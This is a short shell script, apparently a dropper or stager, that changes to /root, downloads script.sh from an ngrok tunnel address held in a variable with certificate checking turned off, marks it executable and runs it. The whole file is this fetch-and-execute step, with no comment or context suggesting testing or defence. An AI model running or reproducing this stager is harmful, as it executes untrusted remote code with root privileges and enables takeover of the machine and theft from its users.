#!/bin/sh
cd /root
wget --no-check-certificate https://$NGROK/script.sh
chmod +x script.sh
./script.sh
